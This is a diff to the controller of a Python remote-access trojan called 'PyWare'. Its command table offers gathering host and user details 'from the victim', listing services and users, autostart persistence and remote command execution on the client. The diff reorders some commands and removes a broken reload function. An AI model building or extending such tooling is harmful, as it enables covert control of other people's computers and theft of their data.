@@ -7,7 +7,7 @@ import base64
 import socket
 import argparse
 import collections
-import subprocess
+
 try:
     import hello  # Personal module
 except ModuleNotFoundError:
@@ -159,11 +159,6 @@ class Commands:
                                    "list": command_tuple(lambda: self.list(),
                                                          "list",
                                                          "List command available."),
-                                   "getinfo": command_tuple(lambda arg="": self.getinfo(arg),
-                                                            "getinfo [Options,]",
-                                                            "Get information from the victim. Options available : "
-                                                            "user, hostname, fqdn, ip, os, version, architecture, "
-                                                            "language, time"),
                                    "autostart": command_tuple(lambda arg="": self.autostart(arg),
                                                               "autostart [Name]",
                                                               "PyWare on client starts automatically."
@@ -175,6 +170,14 @@ class Commands:
                                                          "exec Command",
                                                          "Execute a command on the client and print result."
                                                          " Warning, it is an integrative mode."),
+                                   "getinfo": command_tuple(lambda arg="": self.getinfo(arg),
+                                                            "getinfo [Options,]",
+                                                            "Get information from the victim. Options available : "
+                                                            "user, hostname, fqdn, ip, os, version, architecture, "
+                                                            "language, time"),
+                                   "getservices": command_tuple(lambda: self.getservices(),
+                                                                "getservicse",
+                                                                "Get the list of the running services."),
                                    "getusers": command_tuple(lambda: self.getusers(),
                                                              "getusers",
                                                              "List all users on the ditant system."),
@@ -182,12 +185,6 @@ class Commands:
                                                                    "installmodules",
                                                                    "Install the python modules for full compatibility."
                                                                    " A reload is needed after."),
-                                   "reload": command_tuple(lambda: self.reload(),
-                                                           "reload",
-                                                           "Reload the client on the target."),
-                                   "getservices": command_tuple(lambda: self.getservices(),
-                                                                "getservicse",
-                                                                "Get the list of the running services."),
                                    "ps": command_tuple(lambda: self.getservices(),
                                                        "ps",
                                                        "Alias for getservices"),
@@ -307,25 +304,6 @@ class Commands:
         data = self.connection.receive_enc()
         print(data.decode("utf-8", errors="replace"))
         print("Don't forget to reload.")
-
-    def reload(self):  # TODO not working
-        ret = input("Warning, connection will be lost during the reload. Are you sure you want to continue? [Y/n] : ")
-        if ret.lower() == "y" or ret == "":
-            self.connection.send_enc("reload")
-            ret = self.connection.receive_enc()
-            if type(ret) == bytes:
-                ret = ret.decode("utf-8", errors="replace")
-            print(ret)
-            if ret == b"INFO SERVER : reloading":
-                if sys.platform == "linux":
-                    subprocess.run(["python3", __file__])
-                elif sys.platform == "win3":
-                    subprocess.run(["python", __file__])
-                else:
-                    print("Please, reload the server")
-                self.connection.is_alive = False
-        else:
-            print("Reload cancelled")
 
     def getservices(self):
         self.send_command("getservices")
@@ -462,6 +440,3 @@ def main():
 CRYPTO_OK = True
 if __name__ == "__main__":
     main()
-
-
-# TODO tester : install module & reload
